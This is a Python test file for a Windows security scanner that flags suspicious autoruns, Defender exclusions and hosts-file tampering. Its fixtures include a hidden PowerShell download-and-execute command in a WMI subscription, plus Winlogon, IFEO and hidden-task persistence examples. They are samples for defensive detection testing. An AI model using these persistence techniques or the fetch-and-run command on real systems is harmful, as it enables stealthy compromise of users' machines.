from centinela.models import SignatureState, TargetKind
from centinela.scanners.defender import analyze_defender
from centinela.scanners.hosts import analyze_hosts
from centinela.scanners.persistence import analyze_autoruns
from tests.factories import SYSTEM_ROOT, autorun


def reasons(entries, signatures=None, existing=None):
    exists = (lambda path: True) if existing is None else (lambda path: path in existing)
    return [finding.reason for finding in analyze_autoruns(entries, signatures or {}, exists, SYSTEM_ROOT)]


def test_signed_program_files_autorun_is_clean():
    command = r'"C:\Program Files\Steam\steam.exe" -silent'
    assert reasons([autorun(command)], {r"c:\program files\steam\steam.exe": SignatureState.VALID}) == []


def test_run_key_pointing_to_unsigned_appdata_binary():
    found = reasons([autorun(r"C:\Users\ana\AppData\Roaming\upd\update.exe")], {r"c:\users\ana\appdata\roaming\upd\update.exe": SignatureState.UNSIGNED})
    assert found == ["Sin firma digital", "Ejecutable sin firma válida en carpeta de usuario o temporal"]


def test_orphan_autorun_is_low_signal():
    assert reasons([autorun(r"C:\Old\gone.exe")], existing=set()) == [r"Apunta a un archivo que no existe: C:\Old\gone.exe"]


def test_winlogon_default_values_are_clean_and_tampering_is_flagged():
    clean = [autorun("explorer.exe", "winlogon_shell"), autorun(r"C:\Windows\system32\userinit.exe,", "winlogon_userinit")]
    assert reasons(clean) == []
    tampered = autorun(r"C:\Windows\system32\userinit.exe, C:\Users\Public\x.exe", "winlogon_userinit")
    assert reasons([tampered])[0] == r"Valor de Winlogon modificado: se esperaba c:\windows\system32\userinit.exe,"


def test_wmi_and_ifeo_mechanisms():
    wmi = reasons([autorun("powershell -w hidden -c iex (iwr http://x)", "wmi", TargetKind.WMI)])
    assert wmi[0] == "Suscripción WMI que ejecuta comandos de forma invisible"
    assert "Descarga contenido de internet" in wmi
    ifeo = reasons([autorun(r"C:\Windows\System32\cmd.exe", "ifeo")], {r"c:\windows\system32\cmd.exe": SignatureState.VALID})
    assert ifeo == ["Secuestra la ejecución de otro programa mediante un depurador (IFEO)"]


def test_hidden_scheduled_task():
    task = autorun(r'"C:\ProgramData\svc\run.exe"', "task", TargetKind.TASK, [("hidden", "true")])
    assert "Tarea programada marcada como oculta" in reasons([task])
    signed = {r"c:\programdata\svc\run.exe": SignatureState.VALID}
    assert reasons([task], signed) == []


def test_defender_settings():
    findings = analyze_defender([
        ("path", "C:\\"), ("path", r"C:\Users\ana\AppData\Local\Temp"), ("path", r"D:\Proyectos"),
        ("process", "miner.exe"), ("extension", ".exe"), ("extension", "log"),
        ("realtime", "False"), ("realtime", "True"), ("tamper", "False"),
    ])
    assert [(finding.target.identifier, finding.score) for finding in findings] == [
        ("path:C:\\", 70), (r"path:C:\Users\ana\AppData\Local\Temp", 70), (r"path:D:\Proyectos", 40),
        ("process:miner.exe", 50), ("extension:.exe", 70), ("extension:log", 40),
        ("realtime:False", 40), ("tamper:False", 15),
    ]


def test_hosts_blocking_security_sites():
    lines = [
        "# 127.0.0.1 virustotal.com",
        "127.0.0.1 localhost",
        "0.0.0.0 www.malwarebytes.com update.microsoft.com  # bloqueo",
        "10.0.0.5 intranet.local",
        "0.0.0.0 notmicrosoft.com",
    ]
    findings = analyze_hosts(lines)
    assert len(findings) == 1
    assert findings[0].reason == "Redirige sitios de seguridad o actualizaciones: www.malwarebytes.com, update.microsoft.com"
    assert findings[0].target.detail("line") == lines[2]
